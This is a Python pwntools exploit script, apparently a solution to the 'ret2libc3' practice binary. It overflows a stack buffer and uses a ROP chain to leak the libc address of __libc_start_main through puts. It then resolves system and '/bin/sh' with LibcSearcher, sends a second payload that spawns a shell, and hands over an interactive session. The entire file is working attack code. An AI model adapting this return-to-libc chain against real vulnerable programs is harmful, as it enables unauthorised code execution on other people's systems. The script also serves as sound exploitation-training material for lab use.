from pwn import *
from LibcSearcher.LibcSearcher import LibcSearcher



context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
# p = gdb.debug("./ret2libc3")
p = process("./ret2libc3")
ret2libc3 = ELF("./ret2libc3", checksec=False)

esp = 0xffffcca0
ebp = 0xffffcd28
offset = ebp - (esp + 0x1c) + 4

libc_start_main_got = ret2libc3.got['__libc_start_main']
puts_plt = ret2libc3.plt['puts']
main_addr = ret2libc3.symbols['main']

# leak the address of the function __libc_start_main()
p.sendlineafter(
    "Can you find it !?",
    cyclic(offset) + p32(puts_plt) + p32(main_addr) + p32(libc_start_main_got)
)

# get system addr
libc_start_main_addr = u32(p.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libc_base = libc_start_main_addr - libc.dump('__libc_start_main')#__libc_start_main 减去偏移
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

#get get shell,offset sub 2 addr length
p.sendline(
    cyclic(offset - 8) + p32(system_addr) + cyclic(4) + p32(binsh_addr)
)

p.interactive()